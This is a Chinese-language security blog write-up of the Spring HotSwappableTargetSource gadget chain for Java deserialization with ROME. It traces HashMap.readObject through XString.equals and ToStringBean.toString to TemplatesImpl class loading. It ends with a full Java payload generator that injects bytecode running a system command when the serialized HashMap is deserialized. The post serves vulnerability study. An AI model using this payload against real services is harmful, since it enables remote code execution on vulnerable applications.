# 漏洞篇 - Rome 链之 HotSwappableTargetSource 利用链
> 2024-06-07
> 来源：https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/

HotSwappableTargetSource 是在 Spring AOP 中出现的一个类。作用是可以在代理 bean 运行过程中，动态更新实际 bean 对象。HotSwappableTargetSource 类实现了 TargetSource 接口。对外暴露 getTarget 方法，提供真正的 target 对象。再说的明白一点，HotSwappableTargetSource 是对真正 target 对象的封装。在 Spring 的源码中，体现在 JdkDynamicAopProxy 中的 invoke 方法中。

## HotSwappableTargetSource 利用链

spring 原生的 toString 利用链。

调用链如下：

-   HashMap.readObject
-   HashMap.putVal
-   HotSwappableTargetSource.equals
-   XString.equals
-   ToStringBean.toString

### HotSwappableTargetSource 介绍

HotSwappableTargetSource 是在 Spring AOP 中出现的一个类。作用是可以在代理 bean 运行过程中，动态更新实际 bean 对象。HotSwappableTargetSource 类实现了 TargetSource 接口。对外暴露 getTarget 方法，提供真正的 target 对象。再说的明白一点，HotSwappableTargetSourc 是对真正 target 对象的封装。在 Spring 的源码中，体现在 JdkDynamicAopProxy 中的 invoke 方法中。

HotSwappableTargetSource 类比较特殊的一点是它的 hashcode 方法，无论这个类的对象属性中写入了什么，调用这个对象的 hashcode 方法都会返回相同的结果：

![](https://changeyourway.github.io/images/image-20241008161109755.png)

这就为后面解决 hash 冲突提供了思路。

摘自 [HotSwappableTargetSource 的使用](https://blog.csdn.net/qq_39839075/article/details/106974967)

### 环境搭建

需要导入 Spring 依赖：

```
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>5.3.28</version>
</dependency>
<!-- https://mvnrepository.com/artifact/org.springframework/spring-beans -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-beans</artifactId>
    <version>5.3.28</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>5.3.28</version>
</dependency>
```

### XString#equals(Object)

这个方法会调用参数 obj2 对象的 toString() 方法：

```
public boolean equals(Object obj2)
{
  if (null == obj2)
    return false;

    // In order to handle the 'all' semantics of
    // nodeset comparisons, we always call the
    // nodeset function.
  else if (obj2 instanceof XNodeSet)
    return obj2.equals(this);
  else if(obj2 instanceof XNumber)
      return obj2.equals(this);
  else
  	// 调用 obj2 的 toString() 方法
    return str().equals(obj2.toString());
}
```

所以只需要传入一个 ToStringBean 对象即可。

### HotSwappableTargetSource#equals(Object)

HotSwappableTargetSource 的 equals 方法会调用其成员属性 target 的 equals 方法：

```
@Override
public boolean equals(Object other) {
    return (this == other || (other instanceof HotSwappableTargetSource &&
          this.target.equals(((HotSwappableTargetSource) other).target)));
}
```

this.target 可以在构造方法中赋值：

```
public HotSwappableTargetSource(Object initialTarget) {
    Assert.notNull(initialTarget, "Target object must not be null");
    this.target = initialTarget;
}
```

接下来我们需要对这段代码中的判断逻辑进行一个分析：

-   `this == other`：首先检查 this 和 other 是否是同一个对象引用。如果是，直接返回 true。
-   `other instanceof HotSwappableTargetSource`：检查 other 是否是 HotSwappableTargetSource 对象，如果不是，则整个表达式短路，返回 false。
-   `this.target.equals(((HotSwappableTargetSource) other).target)`：将 other 强制转换为 HotSwappableTargetSource 类型，由于前面的 instanceof 检查已经保证了 other 确实是 HotSwappableTargetSource 对象，这个转换是没问题的，最后调用 equals 方法比较 this 对象的 target 属性与 other 对象的 target 属性是否相等。

所以这个方法的参数 other 需要是一个 HotSwappableTargetSource 对象，且 other 的 target 属性值是 ToStringBean 对象。而 this.target 需要是一个 XString 对象。

### HashMap#putVal(int, K, V, boolean, boolean)

HashMap 的 putVal 方法会调用参数 key 的 equals 方法：

```
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node<K,V>[] tab; Node<K,V> p; int n, i;
    if ((tab = table) == null || (n = tab.length) == 0)
        n = (tab = resize()).length;
    if ((p = tab[i = (n - 1) & hash]) == null)
        tab[i] = newNode(hash, key, value, null);
    else {
        Node<K,V> e; K k;
        if (p.hash == hash &&
            ((k = p.key) == key || (key != null && key.equals(k)))) // 调用 key 的 equals 方法
            e = p;
        else if (p instanceof TreeNode)
            e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
        else {
            for (int binCount = 0; ; ++binCount) {
                if ((e = p.next) == null) {
                    p.next = newNode(hash, key, value, null);
                    if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                        treeifyBin(tab, hash);
                    break;
                }
                if (e.hash == hash &&
                    ((k = e.key) == key || (key != null && key.equals(k)))) 
                    break;
                p = e;
            }
        }
        if (e != null) { // existing mapping for key
            V oldValue = e.value;
            if (!onlyIfAbsent || oldValue == null)
                e.value = value;
            afterNodeAccess(e);
            return oldValue;
        }
    }
    ++modCount;
    if (++size > threshold)
        resize();
    afterNodeInsertion(evict);
    return null;
}
```

值得注意的是，这里要想调用到 key.equals(k) ，需要经过一些判断。

这里在将传入的键值对存入 Node<K,V>\[\] tab 数组时，是这样计算下标的：tab\[i = (n - 1) & hash\]，也就是说下一个键值对应该是插在下标为 i 的地方，如果这个下标为 i 的地方没有值，则插入，但如果要插入的键值对的键和已经存在的键相同，那么就会造成 hash 冲突，进入判断，导致 key.equals(k) 执行。

在上一步的分析中我们知道 HotSwappableTargetSource 的 equals 方法会调用其成员属性 target 的 equals 方法，而 HotSwappableTargetSource 的 equals 方法的参数也需要是一个 HotSwappableTargetSource 对象，为了构造这个条件，那么：

key.equals(k) 这个式子中的 key 和 k 都需要是 HotSwappableTargetSource 对象，且 key.target 是一个 XString 对象，k.target 是一个 ToStringBean 对象。

在这里的 hash 冲突中，k 是已经存在于数组中的 key ，而 key 是传入的，所以 k 对应的键值对要先被 put 进去，然后再 put key对应的键值对。

如下所示，h1.target 是一个 ToStringBean 对象，h2.target 是一个 XString 对象：

```
hashMap.put(h1, "test1");
hashMap.put(h2, "test2");
```

**反序列化调试**

第一次进入 putval 方法时插入的下标为 2 ：

![](https://changeyourway.github.io/images/image-20240611105147293.png)

第二次进入 putval 方法时正好取到了这个 2 ：

![](https://changeyourway.github.io/images/image-20240611105403169.png)

可以看到 i 经过 hash 计算后值是 2 ，所以 p 就取到了下标为 2 的元素，然后一对比，发现两个键值对 hash 相同，但是两个键值对的 key 又不是同一个地址引用（ == 比较内存地址是否相同），所以就调用到了 key.equals(k) 。

然后就是一些疑问的解答：

为什么第二次调用 putval 这个下标 i 正好取到上一个插入的下标呢？

猜测这是 HashMap 的一种机制，HashMap 中不允许有重复的键，如果插入的两个键值对的键相同，则只会对值做一个更新。这里的逻辑大概就是如果有重复的键，那么经过一系列 Hash 计算后这个下标 i 一定会取到数组中已经存在的键相同的键值对。这是因为当初存入的键值对的下标就是根据键的一些 hash 特征确定的，如果键的 hash 特征相同，再计算一次下标，取到的下标自然就相同了。（不保证一定正确）

为什么 HashMap 要这样计算下一个要插入的键值对的下标，而不是老老实实把下标加一然后插入呢？

如果插入的键值对按顺序排列，那么为了避免重复的键出现，每次插入都需要遍历一次集合。用这种方法计算下标，可以快速确定重复的键的位置，而不需要对集合进行遍历，但是会使得插入的下标无规律，有大量空间没有利用。这也是一种典型的用空间换时间的做法。

### HashMap#readObject(java.io.ObjectInputStream)

HashMap 的 readObject 调用了 putVal 方法：

```
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            // 调用了 putVal 方法
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

### 调用栈总结

```
HashMap.readObject(java.io.ObjectInputStream)
HashMap.putVal(int, K, V, boolean, boolean)
HotSwappableTargetSource.equals(Object)
XString.equals(Object)
ToStringBean#toString()
ToStringBean#toString(String)
BeanIntrospector#getPropertyDescriptors(Class)
BeanIntrospector#getPDs(Class)
TemplatesImpl#getOutputProperties()
TemplatesImpl#newTransformer()
TemplatesImpl#getTransletInstance()
TemplatesImpl#defineTransletClasses()
TransletClassLoader#defineClass()
```

### 构造 payload

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class HotSwappableTargetSource_payload {
    public static void main(String[] args) throws Exception {
        // 获取类池
        ClassPool classPool = ClassPool.getDefault();
        // 创建一个名为 Error 的类
        CtClass error = classPool.makeClass("Error");
        // 向 Error 对象中添加静态代码块
        CtConstructor constructor = error.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
        // 设置 Error 的父类为 AbstractTranslet
        CtClass abstractTranslet = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        error.setSuperclass(abstractTranslet);
        // 将 Error 对象输出成字节数组
        byte[] errorBytecode = error.toBytecode();

        // 新建利用链 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setValue(templatesImpl, "_name", "aaa");
        setValue(templatesImpl, "_bytecodes", new byte[][]{errorBytecode});
        setValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);

        // HotSwappableTargetSource 的 equals 方法参数 other 需要是一个 HotSwappableTargetSource 对象
        // other 的 target 属性值需要是 ToStringBean 对象
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        // this.target 需要是一个 XString 对象
        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap<>());

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(h1, "test1");
        hashMap.put(h2, "test2");

        // 反射设置 this.target 为 XString 对象
        setValue(h2, "target", new XString("test"));

        // 序列化成字节数组
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        // 反序列化字节数组
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## 参考文章

[Java 安全学习 —— ROME 反序列化](https://goodapple.top/archives/1145)

[ROME 反序列化](https://www.yuque.com/5tooc3a/jas/mhy3k7vcrdteappp#amGm1)
